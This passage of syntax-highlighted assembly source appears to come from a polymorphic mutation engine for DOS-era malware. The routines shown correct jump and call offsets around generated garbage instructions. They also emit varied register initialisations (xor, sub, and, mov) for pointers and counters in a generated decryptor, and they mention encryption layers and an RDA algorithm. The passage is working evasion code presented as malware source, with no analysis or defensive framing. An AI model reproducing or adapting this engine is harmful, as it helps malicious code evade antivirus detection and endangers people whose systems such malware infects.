        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; normal displacement</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">rda_add</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; in mem position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">rda_add</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; where to place</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">end_most_internal_layer</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; real displacment</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_basic_body</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">; put new displacment</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rda_corr_getback_2</span><span class="sc0">

</span><span class="sc1">; correct some jump type</span><span class="sc0">
</span><span class="sc5">rda_corr_somejump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get type of jump</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">    </span><span class="sc1">; jmp far opcode</span><span class="sc0">

        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">rda_corr_call_jmpfar</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">    </span><span class="sc1">; call opcode</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">rda_corr_call_jmpfar</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; then we have a short jump to correct</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">         </span><span class="sc1">; the offset</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">rda_add</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; where to jump</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">rda_add</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; from where</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">rda_add</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; where to place</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; opcode lenght</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; store</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rda_corr_retback_wbx</span><span class="sc0">


</span><span class="sc1">; corrects the offset for a call or jmp far opcode, so the new offset will</span><span class="sc0">
</span><span class="sc1">; include all the generated garbage to skip.</span><span class="sc0">
</span><span class="sc5">rda_corr_call_jmpfar</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get where to jump (if there</span><span class="sc0">
                        </span><span class="sc1">; wasn't any garbage)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">rda_add</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc1">; where actually to jump (with</span><span class="sc0">
                        </span><span class="sc1">; the garbage included and the</span><span class="sc0">
                        </span><span class="sc1">; call opcode lenght)</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">rda_add</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; - where is this instruction</span><span class="sc0">
                        </span><span class="sc1">; in mem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">rda_add</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; where is this instruction in</span><span class="sc0">
                        </span><span class="sc1">; memory</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; - lenght of opcode</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; store the new offset in place</span><span class="sc0">

</span><span class="sc5">rda_corr_retback_wbx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">rda_corr_getback_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">rda_corr_skip_to_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; lenght of instruction</span><span class="sc0">

        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; to next in plain rda alg</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; to next step in step table</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; last step?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">rda_corr_exit_routine</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rda_corr_loop_begin</span><span class="sc0">

</span><span class="sc5">rda_corr_exit_routine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;    ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ</span><span class="sc0">

</span><span class="sc1">; will correct the pointer and counter initialization instructions generated</span><span class="sc0">
</span><span class="sc1">; before depending on the initialization type used. just a couple of checks</span><span class="sc0">
</span><span class="sc1">; and lenght/pointer corrections.</span><span class="sc0">
</span><span class="sc5">correct_pnt_addr_vals</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">tipo_register</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; init type used</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; initialized just pointer?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">was_init_just_point</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; = 1 counter with imm and pnt</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">was_init_cnt0_pnt</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_assign_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; so set the immediate for the cnt</span><span class="sc0">

</span><span class="sc5">was_init_cnt0_pnt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">was_init_pnt_frstart</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_assign_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_end_after_rda_2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">was_init_cnt_frstart</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_ended_inmem_pnt</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">was_init_cnt_frstart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_check_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">correct_pnt_add_exit</span><span class="sc0">

</span><span class="sc5">was_init_just_point</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">was_init_pnt_frstart_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_assign_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_ended_inmem_pnt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">was_init_cnt_frstart_2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_end_after_rda_2</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">was_init_cnt_frstart_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_check_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">was_init_cnt_frend_2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">was_init_store_cnt</span><span class="sc0">

</span><span class="sc5">was_init_cnt_frend_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">was_init_store_cnt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">correct_pnt_add_exit</span><span class="sc0">


</span><span class="sc5">was_init_pnt_frstart_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">no_countercheck_anyway</span><span class="sc0">

</span><span class="sc5">was_init_pnt_frstart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_check_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">no_countercheck_anyway</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_assign_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">from_endtobegin</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">from_endtobegin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_sp_pointer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_ended_inmem_pnt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">fin_clearloop</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">fin_clearloop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">fin_clearloop</span><span class="sc0">

</span><span class="sc5">correct_pnt_add_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">register_assign_init</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">tipo_register</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; type of init</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">table_init_type</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; select from table one</span><span class="sc0">
                            </span><span class="sc1">; of the three below</span><span class="sc0">

</span><span class="sc1">;    ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ</span><span class="sc0">

</span><span class="sc1">; this sets the counter to zero using one of the three different types</span><span class="sc0">
</span><span class="sc1">; available (xor reg,reg ; sub reg,reg ; and reg,0) and sets the pointer</span><span class="sc0">
</span><span class="sc1">; with a normal mov. saves the pointer assignation position.</span><span class="sc0">
</span><span class="sc5">i_routines_cnt_to_zero_and_pnt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; first three service routines</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">    </span><span class="sc1">; will zero the requested</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; register in different ways</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">service_routines_table</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">        </span><span class="sc1">; mov reg16,imm</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_assign_pos</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">set_the_last_off_i</span><span class="sc0">

</span><span class="sc1">; this initializes the pointer and counter with normal mov instructions and</span><span class="sc0">
</span><span class="sc1">; saves both pointer and counter initialization position if it could be filled</span><span class="sc0">
</span><span class="sc1">; later</span><span class="sc0">
</span><span class="sc5">i_routines_cnt_pnt_with_imm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">        </span><span class="sc1">; mov reg16,imm</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_assign_pos</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">        </span><span class="sc1">; mov reg16,imm</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_assign_pos</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">set_the_last_off_i</span><span class="sc0">

</span><span class="sc1">; this initializes just the pointer register, so special care will be taken</span><span class="sc0">
</span><span class="sc1">; in a later stage for the counter conditions. pointer init position is saved</span><span class="sc0">
</span><span class="sc5">i_routines_just_pointer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">        </span><span class="sc1">; mov reg16,imm</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_assign_pos</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">set_the_last_off_i</span><span class="sc4">:</span><span class="sc0">
